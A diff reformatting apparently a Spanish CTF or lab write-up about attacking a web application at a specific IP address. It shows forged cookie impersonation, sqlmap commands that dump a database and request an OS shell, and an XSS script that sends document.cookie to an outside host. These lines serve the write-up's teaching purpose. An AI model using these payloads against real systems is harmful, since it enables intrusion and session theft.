@@ -42,9 +42,7 @@ Al principio pensamos que era un tipo de jwt pero finalmente descubrimos que est
 
   
 
-{"username":"Admin",
-
-"csrftoken":"u32t4o3tb3gg431fs34ggdgchjwnza0l=","Expires=":"Friday, 13 Oct 2018 00:00:00 GMT"}
+`{"username":"Admin","csrftoken":"u32t4o3tb3gg431fs34ggdgchjwnza0l=","Expires=":"Friday, 13 Oct 2018 00:00:00 GMT"}`
 
   
 
@@ -52,7 +50,7 @@ Ademas, una vez seteada esta cookie el la pagina falla con un error 500 mostrand
 
   
 
-SyntaxError: Unexpected token F in JSON at position 79
+`SyntaxError: Unexpected token F in JSON at position 79
 
 at JSON.parse (<anonymous>)
 
@@ -72,7 +70,7 @@ at /under/node_modules/express/lib/router/index.js:281:22
 
 at Function.process_params (/under/node_modules/express/lib/router/index.js:335:12)
 
-at next (/under/node_modules/express/lib/router/index.js:275:10)
+at next (/under/node_modules/express/lib/router/index.js:275:10)`
 
   
 
@@ -84,9 +82,7 @@ El siguiente paso fue ver que pasaba si modificábamos la cookie profile, usando
 
   
 
-{"username":"Seguridad",
-
-"csrftoken":"u32t4o3tb3gg431fs34ggdgchjwnza0l=","Expires=":"Friday, 13 Oct 2018 00:00:00 GMT"}
+`{"username":"Seguridad", "csrftoken":"u32t4o3tb3gg431fs34ggdgchjwnza0l=","Expires=":"Friday, 13 Oct 2018 00:00:00 GMT"}`
 
 y viendo que en la pagina se mostraba Hello Seguridad.
 
@@ -128,7 +124,7 @@ Con el comando:
 
   
 
-python sqlmap.py -u "http://143.0.100.198:5010/meme?id=1" --batch --dbs
+	python sqlmap.py -u "http://143.0.100.198:5010/meme?id=1" --batch --dbs
 
   
 
@@ -164,7 +160,7 @@ luego con el siguiente comando
 
   
 
-python sqlmap.py -u "http://143.0.100.198:5010/meme?id=1" --batch --tables -D memes_db
+	python sqlmap.py -u "http://143.0.100.198:5010/meme?id=1" --batch --tables -D memes_db
 
   
 
@@ -202,7 +198,7 @@ con el comando:
 
   
 
-python sqlmap.py -u "http://143.0.100.198:5010/meme?id=1" --batch --dump -T memes -D memes_db
+	python sqlmap.py -u "http://143.0.100.198:5010/meme?id=1" --batch --dump -T memes -D memes_db
 
   
 
@@ -214,7 +210,7 @@ Finalmente intentamos con el comando
 
   
 
-python sqlmap.py -u "http://143.0.100.198:5010/meme?id=1" --batch --os-shell
+	python sqlmap.py -u "http://143.0.100.198:5010/meme?id=1" --batch --os-shell
 
   
 
@@ -257,7 +253,7 @@ y luego enviando el siguiente input
 
   
 
-<script>var i = new Image; i.src = "http://192.168.0.70:8000/"+document.cookie ; </script>
+	<script>var i = new Image; i.src = "http://192.168.0.70:8000/"+document.cookie ; </script>
 
   
 
